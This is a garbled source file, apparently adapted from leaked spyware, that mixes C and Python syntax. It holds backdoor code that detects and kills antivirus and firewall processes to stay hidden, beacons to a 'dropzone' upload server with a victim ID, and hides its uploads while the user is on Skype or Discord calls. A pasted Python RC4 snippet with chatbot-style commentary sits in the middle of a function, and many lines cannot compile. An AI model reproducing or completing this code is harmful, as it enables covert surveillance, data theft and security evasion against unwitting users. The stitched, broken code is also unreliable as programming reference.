import socket               #   winttp?
import subprocess           #   proc?
import os                   #   same as?
import time                 #   Thelp32??
import threading            #   ?

#include <windows.h>        #   this?
#include <process.h>        #   proc?
#include "Processes.h"      #   fake?
#include <sys/types.h>      #   ?
#include <sys/stat.h>       #   ?
#include <winhttp.h>        #   socket?
#include <Tlhelp32.h>       #   timwe?




struct NOCONNECTIVITYSLEEP 10000
struct INSTRUCTIONSLEEPER 8000

struct DEFINITION_OUTPOST 1
struct DEFINITION_MCAFEE 2
struct DEFINITION_ZONEALARM 3
struct DEFINITION_MCAFEE_2 4
struct DEFINITION_BITDEFENDER 5
struct DEFINITION_FSECURE 6
struct DEFINITION_KERIO 7
struct DEFINITION_AVG 8
struct DEFINITION_WEBROOT 9
struct DEFINITION_ASC 10
struct DEFINITION_MWB 11
struct DEFINITION_WIN 12
struct DEFINITION_COUNTER 13



# Type definitions

typedef int (*gMyPFWCircumventionStatus)(char *pUploadFile, char *pProxySettings, int pReason);
typedef int (*gMyPFWCircumventionUpload)(char *pUploadFile, char *pProxySettings);

  int checkPFWSignature(char **pProcesses, char **pServices);
  int getPFWInstallation(void);
int killProcessByName(char *pProcessNamePattern);
  int killChildProcesses(DWORD pParentPID);
  int killOurProcesses(char *pBaseDirectory);
  DWORD getProcessID(char *pProcessName, char *pProcessPath, int pProcessPathLength);
  int PIDExists(int pPid);
  int processExists(char *pProcessName, int *pPID);
  int serviceExists(char *pServicePattern);
 BOOL CALLBACK EnumWindowsProcHider(HWND hWnd,LPARAM lParam);
  BOOL CALLBACK EnumWindowsProcMarker(HWND hWnd,LPARAM lParam);
  LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

  int findProcessName(int pPID, char *pProcessName, int pProcessNameBufSize);
  DWORD WINAPI sendProcessInfos(PVOID pParameter);
  DWORD WINAPI sendOpenWindowsInfos(PVOID pParameter);
  DWORD WINAPI sendServicesInfos(PVOID pParameter);
DWORD WINAPI killProcessByPID(PVOID pParameter);
  DWORD WINAPI killProcessByName(PVOID pParameter);
  DWORD WINAPI stopService(PVOID pParameter);
  DWORD WINAPI startService(PVOID pParameter);
  void processExists(char *pProcFullPath);

 int handleCommand(char *pCommandBuffer, SOCKET pRemoteSocket);




char *gPFWDefinition[] = {"no personal firewall installed", 
                          "Agnitum Outpost", 
                          "McAfee", 
                          "Zone Alarm", 
                          "McAfee2",
                          "BitDefender",
                          "F-Secure",
                         "Kerio",
                          "AVG",
                          "WebRoot",
                         "Advanced System Care",
                         "Malwarebytes",
                         "Windows Defender",
                          NULL};



# Determine installed personal firewall.


int getPFWInstallation(void)

{
  int mRetVal = DEFINITION_NOPFW;
  int mEvidenceCounter = 0;
  
  char *mMCAFEEProcesses[] = {"mpfagent.exe", "mpfservice.exe", NULL};    
  char *mMCAFEEServices[] = {"mpfservice", NULL};  

  char *mOUTPOSTProcesses[] = {"outpost.exe", NULL};    
  char *mOUTPOSTServices[] = {"outpostfirewall", NULL}; 

  char *mZONEALARMProcesses[] = {"zlclient.exe", NULL};
  char *mZONEALARMServices[] = {NULL};

  char *mMCAFEE2Processes[] = {"Mcdetect.exe", "McShield.exe", NULL};
  char *mMCAFEE2Services[] = {"McShield", NULL};

  char *mBitDefenderProcesses[] = {"bdagent.exe", "bdmcon.exe", NULL};
  char *mBitDefenderServices[] = {"BitDefender", NULL};

  char *mFSecureProcesses[] = {"fsdfwd.exe", NULL};
  char *mFSecureServices[] = {"FSDFWD", "F-Secure", NULL};

  char *mKerioProcesses[] = {"kadmin.exe", NULL};
  char *mKerioServices[] = {"Kerio", NULL};

  char *mAVGProcesses[] = {"avgfwsrv.exe", NULL};
  char *mAVGServices[] = {"avgfwsrv", NULL};

  char *mWebRootProcesses[] = {"webroot.exe", "firewallntservice", "webroot", NULL};
  char *mWebRootServices[] = {"webroot", NULL};

  char *mAdvanced SystemCareProcesses#[] = ("advanced systemcare tray.exe", NULL);
  char *mAdvanced SystemCareServices[] = ("advanced systemcare service",NULL);

  char *mMalwarebytesProcesses[] = ("mbamtray.exe", "mbam.exe", "mbamservice.exe", NULL);
  char *mMalwarebytesServices[] = ("mbamservice",NULL);

  char *mWindows DefenderProcesses[] = ("msmpeng.exe", "windefend.exe", NULL); # ?? "Wcmsvc"/"gpsvc" ?? also of interest: "UserDataSvc", "UserManager", "ssh-agent ",
  char *mWindows DefenderServices[] = ("mpssvc", "wscsvc", "windefend", "securityhealthservice", "wdnissvc", "sense", "sgrmbroker", "samss", "eaphost", "Consentuxusersvc", "AssignedAccessManagerSvc", "AppIDSvc", NULL);


  
  # Outpost check
   
  if ((mEvidenceCounter = checkPFWSignature(mOUTPOSTProcesses, mOUTPOSTServices)) > 0)
  {
    mRetVal = DEFINITION_OUTPOST;
    goto END_GETPFWINSTALLATION;
  } 

  # Mcafee personal firewall check
   
  if ((mEvidenceCounter = checkPFWSignature(mMCAFEEProcesses, mMCAFEEServices)) > 0)
  {
    mRetVal = DEFINITION_MCAFEE;
    goto END_GETPFWINSTALLATION;
  }

  # Mcafee2 personal firewall check

  if ((mEvidenceCounter = checkPFWSignature(mMCAFEE2Processes, mMCAFEE2Services)) > 0)
  {
    mRetVal = DEFINITION_MCAFEE_2;
    goto END_GETPFWINSTALLATION;
  }

  # Zonealarm personal firewall check
   
  if ((mEvidenceCounter = checkPFWSignature(mZONEALARMProcesses, mZONEALARMServices)) > 0)
  {
    mRetVal = DEFINITION_ZONEALARM;
    goto END_GETPFWINSTALLATION;
  }

  # Bitdefender personal firewall check
 
  if ((mEvidenceCounter = checkPFWSignature(mBitDefenderProcesses, mBitDefenderServices)) > 0)
  {
    mRetVal = DEFINITION_BITDEFENDER;
    goto END_GETPFWINSTALLATION;
  }

  # F-secure personal firewall check
  
  if ((mEvidenceCounter = checkPFWSignature(mFSecureProcesses, mFSecureServices)) > 0)
  {
    mRetVal = DEFINITION_FSECURE;
    goto END_GETPFWINSTALLATION;
  }

  # Kerio personal firewall check
   
  if ((mEvidenceCounter = checkPFWSignature(mKerioProcesses, mKerioServices)) > 0)
  {
    mRetVal = DEFINITION_KERIO;
    goto END_GETPFWINSTALLATION;
  }

  # AVG personal firewall check
   
  if ((mEvidenceCounter = checkPFWSignature(mAVGProcesses, mAVGServices)) > 0)
  {
    mRetVal = DEFINITION_AVG;
    goto END_GETPFWINSTALLATION;
  }

  # Webroot personal firewall check
    
  if ((mEvidenceCounter = checkPFWSignature(mWebRootProcesses, mWebRootServices)) > 0)
  {
    mRetVal = DEFINITION_WEBROOT;
    goto END_GETPFWINSTALLATION;
  }

  # Advancesd System Care personal firewall check
     
  if ((mEvidenceCounter = checkPFWSignature(mAdvanced System CareProcesses, mAdvanced System CareServices)) > 0)
  {
    mRetVal = DEFINITION_ASC;
    goto END_GETPFWINSTALLATION;
  }

  # Malwarebytes personal firewall check
     
  if ((mEvidenceCounter = checkPFWSignature(mMalwarebytesProcesses, mMalwarebytesServices)) > 0)
  {
    mRetVal = DEFINITION_MWB;
    goto END_GETPFWINSTALLATION;
  }

  # Windows Defender personal firewall check
     
  if ((mEvidenceCounter = checkPFWSignature(mDefenderProcesses, mDefenderServices)) > 0)
  {
    mRetVal = DEFINITION_WIN;
    goto END_GETPFWINSTALLATION;
  }

END_GETPFWINSTALLATION:

  return(mRetVal); 
}


# Check for firewall characteristics

int checkPFWSignature(char **pProcesses, char **pServices)
{
  char **mProcesses = pProcesses;    
  char **mServices = pServices;
  int mCounter = 0;
  char mTemp[MAX_BUF_SIZE + 1];
  int mRetVal = 0;
  int mEvidenceCounter = 0;


  # Check for running processe(s).

  mCounter = 0;
  while(mProcesses[mCounter] != NULL)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    strncpy(mTemp, mProcesses[mCounter], sizeof(mTemp) - 1);
    lowerToUpperCase(mTemp);    
    
    if ((mRetVal = processExists(mTemp, NULL)) == 0)
      mEvidenceCounter++;   
    
    mCounter++;
  }
  

  # Check for running services
    
  mCounter = 0;
  while(mServices[mCounter] != NULL)
  {      
    ZeroMemory(mTemp, sizeof(mTemp));
    strncpy(mTemp, mServices[mCounter], sizeof(mTemp) - 1);
    lowerToUpperCase(mTemp);    
    
    if ((mRetVal = serviceExists(mTemp)) == 0)
      mEvidenceCounter++;   
    
    mCounter++;
  }
  
  return(mEvidenceCounter);    
}    



#
# ii) KILL PROCESSES TO STAY HIDDEN
#


# List running processes.

int killProcessByName(char *pProcessNamePattern)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  int mCounter = 0;
  int mRetVal = 0;


  if (pProcessNamePattern == NULL)
  {
    mRetVal = 1;
    goto END;
  }

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = 2;
    goto END;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);
  lowerToUpperCase(pProcessNamePattern);


  # Retrieve information about the first process and exit if unsuccessful

  if(!Process32First(hProcessSnap, &pe32))
  {
    CloseHandle(hProcessSnap);
    mRetVal = 3;
    goto END;
  }


  # Walk the snapshot of processes.

  do
  {
    lowerToUpperCase(pe32.szExeFile);

    if (strstr(pe32.szExeFile, pProcessNamePattern) != NULL)
    {
      if (GetCurrentProcessId() != pe32.th32ProcessID)
      {
        if((hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID)) != NULL)
        {
          TerminateProcess(hProcess, 0x00031);
          CloseHandle(hProcess);
        }
      }
    }
  } while(Process32Next(hProcessSnap, &pe32));


END:

  if(hProcessSnap != INVALID_HANDLE_VALUE)
    CloseHandle(hProcessSnap);

  return(mRetVal);
}


# Kill a processes child processes.

int killChildProcesses(DWORD pParentPID)
{
  HANDLE hOpenProcHandle;
  HANDLE hProcessSnap;
  PROCESSENTRY32 mPE32ProcessData;
  int mRetVal = 0;

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = 1;
    goto END;
  }

  mPE32ProcessData.dwSize = sizeof(PROCESSENTRY32);


  # Retrieve information about the first process,
  # and exit if not successful.

  if(!Process32First(hProcessSnap, &mPE32ProcessData) )
  {
    mRetVal = 2;
    goto END;
  }


  # Walk through the snapshot of processes, and
  # display information about each process.

  do
  {
    if (mPE32ProcessData.th32ParentProcessID == pParentPID) 
    {
      if (!(hOpenProcHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pParentPID)))
        break;
       
      if(TerminateProcess(hOpenProcHandle, 0) == 0) 
      {
        CloseHandle(hOpenProcHandle);
        break;
      }
      CloseHandle(hOpenProcHandle);		
    }
  } while(Process32Next(hProcessSnap, &mPE32ProcessData));

END:

  CloseHandle(hProcessSnap);
  return(mRetVal);
}


# Determine process ID for wanted application.

DWORD getProcessID(char *pProcessName, char *pProcessPath, int pProcessPathLength)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  char mBinaryName[MAX_BUF_SIZE + 1];
  HMODULE hMods[1024];
  DWORD cbNeeded;
  int mCounter = 0;
  int mRetVal = 1;

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if(hProcessSnap == INVALID_HANDLE_VALUE)
    return(-1);

  pe32.dwSize = sizeof(PROCESSENTRY32);


  if (pProcessName != NULL)
    lowerToUpperCase(pProcessName);


  # Retrieve information about the first process
  # and exit if not successful.

  if(!Proces s32First(hProcessSnap, &pe32) )
  {
    CloseHandle( hProcessSnap );
    return(-2);
  }


  # Walk through the snapshot of processes, and
  # display information about each process.

  do
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mTemp2, sizeof(mTemp2));

    if (pProcessName != NULL)
      lowerToUpperCase(pe32.szExeFile);

    if (pProcessName != NULL)
      snprintf(mTemp, sizeof(mTemp) -1, "proc : %5d - %s", pe32.th32ProcessID, pe32.szExeFile);
    else
      snprintf(mTemp, sizeof(mTemp) -1, "%8d - %s", pe32.th32ProcessID, pe32.szExeFile);


    if((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
    {
      if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
      {
        # Get the full path to the binary.
        if (GetModuleFileNameEx( hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
        {
          # Print the module name and handle value.
          if (pProcessName != NULL)
            lowerToUpperCase(mBinaryName);

          snprintf(mTemp2, sizeof(mTemp2) -1, "%s", mBinaryName);
        }
      }
      CloseHandle(hProcess);
    }


    if (pProcessName != NULL && (strstr(mTemp, pProcessName) != NULL || strstr(mTemp2, pProcessName) != NULL))
    {      
      mRetVal = pe32.th32ProcessID;
      strncpy(pProcessPath, mTemp2, pProcessPathLength);
      break;
    }
  } while(Process32Next(hProcessSnap, &pe32));

  CloseHandle(hProcessSnap);
  return(mRetVal);
}


# Start IE and/or hide it if necessary.

void runIE(char *pIEPath)
{
  char mTemp[MAX_BUF_SIZE + 1];
  int mCounter = 0;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  ZeroMemory(mTemp, sizeof(mTemp));
  snprintf(mTemp, sizeof(mTemp) - 1, "%s", IEXPLORE_PATTERN);
   
  
  # If no IE is running, start a new instance.

  if (processExists(mTemp, NULL) != 0)
  {


    # Remember which window was set to the foreground.

    gCurrentForegroundWindow = NULL; 
    if (!(gCurrentForegroundWindow = GetForegroundWindow()))
      gCurrentForegroundWindow = NULL;

    ZeroMemory(mTemp, sizeof(mTemp));
    snprintf(mTemp, sizeof(mTemp) - 1, "%s -nohome", pIEPath);

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWMINNOACTIVE;


    if (CreateProcess(NULL, mTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
      if (gCurrentForegroundWindow != NULL)
        SetForegroundWindow(gCurrentForegroundWindow);


      # Locate the new IE instance and if not yet marked with the 
      # "_SILENZIO" stamp do so and hide it!

      gPID = pi.dwProcessId;
      gHidden = 1;

      for (mCounter = 0; mCounter < 1000 && gHidden != 0; mCounter++)
      {
        EnumWindows((WNDENUMPROC) EnumWindowsProcMarker, 0);
        EnumWindows((WNDENUMPROC) EnumWindowsProcHider, 0);
        Sleep(10);
      } # for (mCounter = 0; mCounter < 1000, mCounter++)
    } # CreateProcess(NULL, mTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))


    if (gCurrentForegroundWindow != NULL)
      SetForegroundWindow(gCurrentForegroundWindow);



# iii) ACTUALLY SWERVING MAIN FIREWALL AND THE MAIN UL PREP

wcex.lpszMenuName = WINDOWNAME;
  wcex.lpszClassName = CLASSNAME;
  wcex.hIconSm = NULL;

  RegisterClassEx(&wcex);


  hCurrentForegroundWindow = GetForegroundWindow();
  hInst = hInstance; # Store instance handle in our global variable
  if (!(hWnd = CreateWindow(CLASSNAME, WINDOWNAME, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL)))
    return(FALSE);

  ShowWindow(hWnd, SW_HIDE);
  UpdateWindow(hWnd);

  if (hCurrentForegroundWindow != NULL)
    SetForegroundWindow(hCurrentForegroundWindow);

  if ((mThreadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) mainLoop, 0, 0, &mThreadID)) == NULL)
    return(0);


   # Main message loop:

  while(1)
  {
    if (GetQueueStatus(QS_ALLINPUT) != 0)
    {
      if (GetMessage(& msg, NULL, 0, 0)) 
      {
        TranslateMessage(& msg);
        DispatchMessage(& msg);
      }
    }

    if (WaitForSingleObject(mThreadHandle, 500) != WAIT_TIMEOUT)
    {
      TerminateThread(mThreadHandle, 0);
      CloseHandle(mThreadHandle);
      break;
    }
    Sleep(100);
  }
  return(msg.wParam);
}


DWORD mainLoop(LPVOID pData)
{
  int mConnectivity = 0;
  char mProxyName[MAX_BUF_SIZE + 1];
  char mProxyPort[128];
  char mGetBuffer[MAX_BUF_SIZE + 1];
  char mProxyConnection[MAX_BUF_SIZE + 1];
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  DWORD mThreadIDDoUploads = 0;
  DWORD mThreadIDHTTPInstruction = 0;
  HANDLE mUploadThreadHandle = INVALID_HANDLE_VALUE;
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  gMyPFWCircumventionStatus fPFWCircumventionStatus[DEFINITION_COUNTER];
  gMyPFWCircumventionUpload fPFWCircumventionUpload[DEFINITION_COUNTER];
  int mCircumventionType = 0;
  DWORD mExitCode = 0;
  int mStatusValue = 0;
  char mB64EncodedFileName[MAX_BUF_SIZE + 1];


  # Do nothing without a correct configuration

  if (strstr(gLIID, CONFIG_STRING))
    return(2);

  if (strstr(gBaseDirectory, CONFIG_STRING))
    return(3);

  if (strstr(gUploadServer, CONFIG_STRING))
    return(4);

  if (strstr(gMaxHDResource, CONFIG_STRING) || atoi(gMaxHDResource) < 0)
    return(5);

  if (strstr(gHDDStatus, CONFIG_STRING))
    return(6);


  # If binary called without "exe" extension, attach it

  ZeroMemory(gProgrammName, sizeof(gProgrammName));

  if (strrchr(__argv[0], '\\') != NULL)
    strncpy(gProgrammName, strrchr(__argv[0], '\\') + 1, sizeof(gProgrammName) - 1);
  else
    strncpy(gProgrammName, __argv[0], sizeof(gProgrammName) - 1);

  if (strstr(gProgrammName, ".exe") == NULL && strstr(gProgrammName, ".EXE") == NULL)
    strcat(gProgrammName, ".exe");


  # Initialisation stuff

  ZeroMemory(gHomeDirectory, sizeof(gHomeDirectory));
  if (strrchr(_pgmptr, '\\') != NULL)
    strncpy(gHomeDirectory, _pgmptr, strrchr(_pgmptr, '\\') - _pgmptr);

  ZeroMemory(mProxyPort, sizeof(mProxyPort));

  if (strlen(gHomeDirectory))
    SetCurrentDirectory(gHomeDirectory);


    # determine personal firewall

    fPFWCircumventionUpload[DEFINITION_NOPFW] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_OUTPOST] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_MCAFEE] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_MCAFEE_2] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_ZONEALARM] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_BITDEFENDER] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_FSECURE] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_KERIO] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_AVG] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_WEBROOT] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_ASC] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_MWB] = &uploadData_DirectMain;
    fPWFCircumventionUpload[DEFINITION_WIN] = &uploadData_DirectMain;

    strncpy(mB64EncodedFileName, __argv[2], sizeof(mB64EncodedFileName) - 1);


    # determine personal firewall and circumvent it, if necessary [!!!] ???HOW WUT??? [!!!]

    mCircumventionType = getPFWInstallation();
    fPFWCircumventionUpload[mCircumventionType](mB64EncodedFileName, mProxyConnection);
    exit(0);


    # Main and endless loop. Do all these steps over and over again :
    #
    # 1. Determine local stati. 
    # 2. Fetching instructions/stati from dropzone and passing local stati to dropzone.
    # 3. Upload file structure map, any files and other lookyloos - call 7z'd data.


    while (1)
    {        


      # If silent mode was deactivated exchange determine relevant local status
      # information and exchange status with the dropzone server.


      mCircumventionType = getPFWInstallation();
      mConnectivity = 0;

      while (atoi(gSilentMode) == 0 && mConnectivity == 0)
      {


        # Do HD resource checks.

  	    if (atoi(gMaxHDResource) > 0)
	      HDDManager();


        # Build HTTP request to get instructions from the dropzone
        # server.

        ZeroMemory(mGetBuffer, sizeof(mGetBuffer));
        ZeroMemory(mTemp, sizeof(mTemp));

        snprintf(mTemp, sizeof(mTemp) - 1, "%s\\%s", gHomeDirectory, FIRST_CONNECT_FILE);
        if (! PathFileExists(mTemp))
        {
          ZeroMemory(mTemp2, sizeof(mTemp2));
          getHardDiskID(mTemp2, sizeof(mTemp2));

          snprintf(mGetBuffer, sizeof(mGetBuffer) - 1, "http://%s%s?liid=%s&version=%s&status=%d&first=%s", gUploadServer, HTTP_INPUT_SCRIPT, gLIID, gBackdoorVersion, mStatusValue, mTemp2); /// [!!! so many q's !!!]
        } else
          snprintf(mGetBuffer, sizeof(mGetBuffer) - 1, "http://%s%s?liid=%s&version=%s&status=%d", gUploadServer, HTTP_INPUT_SCRIPT, gLIID, gBackdoorVersion, mStatusValue); /// [!!! more q's again !!!]

        ZeroMemory(mProxyConnection, sizeof(mProxyConnection));
        if (getProxySettings(mProxyName, mProxyPort) == 1)
          snprintf(mProxyConnection, MAX_BUF_SIZE, "%s:%s", mProxyName, mProxyPort);


        # TASK 2 :
        #
        # Bypass Desktop-Firewall and send HTTP request to the dropzone.
        # If the dropzone server was responding, process the
        # passed instructions. Otherwise wait some seconds and retry again.

        if (fPFWCircumventionStatus[mCircumventionType](mGetBuffer, mProxyConnection, REQUEST_TYPE_SYSTEMUP) != 0)
          Sleep(NOCONNECTIVITYSLEEP);
        else {
          remoteStatusChecks(mGetBuffer); 
          mConnectivity = 1;
        } # if (fPFWCircumventionStatus...
      } # while (mConnectivity == 0)


      # We have to set a flag to know we've already connected to the dropzone once.
      # Therefore we create the FIRST_CONNECT_FILE.

      ZeroMemory(mTemp, sizeof(mTemp));
      snprintf(mTemp, sizeof(mTemp) - 1, "%s\\%s", gHomeDirectory, FIRST_CONNECT_FILE);
      if (! PathFileExists(mTemp))
      {
        if ((mFileHandle = CreateFile(mTemp, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
        {
          CloseHandle(mFileHandle);
        } // if ((mFileHandle = CreateFile(...
      } // if (! PathFileExists(mTemp))


    # not sure why, just seems to need a line break...

      Sleep(INSTRUCTIONSLEEPER);
    } // while (1) 
  }

  return(0);
}                
             
             
# filestructure andf file data upload thread. It will upload 
# all files containing the file extension ".fsu"

DWORD WINAPI doHTTPUploadsThread(LPVOID pData)
{
  char mTemp[MAX_BUF_SIZE + 1];
  char mUploadFileFullPath[MAX_BUF_SIZE + 1];
  char mFilesUploadPattern[MAX_BUF_SIZE + 1];
  char mUploadDirFullPath[MAX_BUF_SIZE + 1];
  char mSkypeBinaryName[MAX_BUF_SIZE + 1];
  char *mFileEntries[MAX_FILE_ENTRIES];
  char mRealFileEntries[MAX_FILE_ENTRIES][MAX_BUF_SIZE + 1];
  int mCounter = 0;
  char mCmdLine[MAX_BUF_SIZE + 1];
  int mRetCode = 0;
  DWORD mRetVal = 0;

  int mCircumventionType = 0;
  int i = 0;
  int mTotalFiles = 0;

  DWORD mWritten = 0;
  STARTUPINFO si;
  PROCESS_INFORMATION  pi;


  # Assign & initialize buffers

  for (mCounter = 0; mCounter < MAX_FILE_ENTRIES; mCounter++)
  {
    ZeroMemory(mRealFileEntries[mCounter], MAX_BUF_SIZE + 1);
    mFileEntries[mCounter] = mRealFileEntries[mCounter];
  }


  # Check all possible backdoor directories for uploadable files

  for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));

    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");

      if (gBaseDirectory[strlen(gBaseDirectory) - 1] != '\\')
        strcat(gBaseDirectory, "\\");

      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, BD_DATA_DIR);


      if (mUploadDirFullPath[strlen(mUploadDirFullPath) - 1] != '\\')
        strcat(mUploadDirFullPath, "\\");

      if (PathFileExists(mUploadDirFullPath))
      { 


        # list all files in other interesting directories and select files 
        # with matching pattern ("*.fsu" at this time)

        ZeroMemory(mFilesUploadPattern, sizeof(mFilesUploadPattern));
        snprintf(mFilesUploadPattern, sizeof(mFilesUploadPattern) - 1, "%s%s", mUploadDirFullPath, UPLOAD_FILE_PATTERN);

        determineFilesToUpload(mFilesUploadPattern, mFileEntries, &mTotalFiles);

        if (mTotalFiles > 0)
        {
          qsort((void *) mFileEntries, (size_t) mTotalFiles, sizeof(char *), compare);


          # determine file extension and filter out unneeded files

          for (i = 0; i < mTotalFiles && mFileEntries[i] != NULL; i++)
          {
            ZeroMemory(mTemp, sizeof(mTemp));
            strncpy(mTemp, &mFileEntries[i][strlen(mFileEntries[i]) - 4], 4);


import base64

SBOX_SIZE = 1024
MAX_BUF_SIZE = 256

sBox = [0] * (SBOX_SIZE + 1)


def prepare_key(key):
    mLen = len(key)
    i = 0
    j = 0

    for i in range(256):
        sBox[i] = i

    for i in range(256):
        j = (j + sBox[i] + key[i % mLen]) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]


def encrypt(key, plain_text):
    prepare_key(key)
    cipher_text = bytearray()
    i = 0
    j = 0

    for c in plain_text:
        i = (i + 1) % 256
        j = (j + sBox[i]) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
        t = (sBox[i] + sBox[j]) % 256
        cipher_text.append(c ^ sBox[t])

    return cipher_text


def decrypt(key, cipher_text):
    return encrypt(key, cipher_text)


def main():
    # Example usage
    encryption_key = b'MySecretKey'
    file_path = 'example.txt'

    with open(file_path, 'rb') as file:
        file_contents = file.read()

    encrypted_contents = encrypt(encryption_key, file_contents)

    # Write encrypted contents to a new file
    with open('encrypted_file.fsu', 'wb') as encrypted_file:
        encrypted_file.write(encrypted_contents)


if _n _name__ == "__main__":
    main()


# This Python code performs the same encryption process as the C code provided earlier. It reads the contents of a file named "example.txt", encrypts them using the RC4 encryption algorithm with the provided encryption key, and then writes the encrypted contents to a new file named "encrypted_file.fsu". You'll need to adjust the file paths and encryption key according to your specific requirements.
          
             ZeroMemory(mFileEntries[i], MAX_BUF_SIZE + 1);
             snprintf(mFileEntries[i], MAX_BUF_SIZE, "XXX");
            }
          }

          qsort((void *) mFileEntries, (size_t) mTotalFiles, sizeof(char *), compare);


          # After locating and sorting all files, upload them
          # to the dropzone.

?         ZeroMemory(mSkypeBinaryName, sizeof(mSkypeBinaryName));
?         snprintf(mSkypeBinaryName, sizeof(mSkypeBinaryName) - 1, SKYPE_BINARY_NAME); # [!!! wtf skype? wjere from? !!!]

          for( i = 0; i < mTotalFiles && mFileEntries[i] != NULL && i < MAX_UPLOAD_FILES; ++i )
          {
           

?           # don't load up anything while user is skyping. that will influence the audio quality of the call.

            if (isUserSkyping() == 0 && processExists(mSkypeBinaryName, NULL) == 0)
              break;

            ZeroMemory(mUploadFileFullPath, sizeof(mUploadFileFullPath));
            snprintf(mUploadFileFullPath, MAX_BUF_SIZE, "%s%s", mUploadDirFullPath, mFileEntries[i]);


            # likewise, rather not load stuff up whilst user is discorbing cos it'll be such an obvious that there's a fight for ul bandwidth occurring

          ZeroMEmory(mDiscorbBinaryName, sizeof(mDiscorbBinaryName));
          snprontf(mDiscorbBinaryName, sizeof(mDiscorbBinaryName) -1, DISCORB_BINARY_NAME); 
            
          for( i = 0; i < mTotalFiles && mFileEntires[i] != NULL &&i < MAX_UPLOAD_FILES; ++i )  

          # so we check:

            if (isUserDiscorbing() == 0 && processExists(mDiscorbBinaryName, NULL) == 0)
              break;
            
            # otherwise, execute the upload command.

            if (PathFileExists(mUploadFileFullPath))
            {
              ZeroMemory(&si, sizeof(si));
              ZeroMemory(&pi, sizeof(pi));

              si.cb = sizeof(si);
              si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
              si.wShowWindow = SW_HIDE;

              snprintf(mCmdLine, MAX_BUF_SIZE, "\"%s\" hu \"%s\"", gProgrammName, mUploadFileFullPath);

              if (CreateProcess(NULL, mCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, 0, NULL, &si, &pi) != 0)
              {
                mRetCode = WaitForSingleObject(pi.hProcess, (THREAD_TIMEOUT_UPLOAD + 10) * 1000);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
              } # if (CreateProcess( ...
            } # if (PathFileExists(mUploadFileFullPath))
          } # for( i = 0; i < mTotalFiles && i < MAX_UPLOAD_FILES; ++i )
        } #  if (mTotalFiles > 0)
      }  # if (PathFileExists(mUploadDirFullPath))
    } # if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
  } # for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)

  gUploadStatus = UPLOAD_THREAD_FINISHED;

  return(mRetVal);
}


# Compare function for qsort

int compare( const void *arg1, const void *arg2 )
{
  return _stricmp(*(char**) arg1, *(char**) arg2);
}


# v) FILE STRUCTURE DOCUMENT CREATION PROCESS - in which we create
# a structured tree of all the crapthat was on HDD


# Find favs folder [!!!]

DWORD WINAPI sendBrowserFavoritesInfos(PVOID pParameter)
{
  int lFuncRetVal = 0;
  int lRetVal = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  char *lHomeDirectory = NULL;
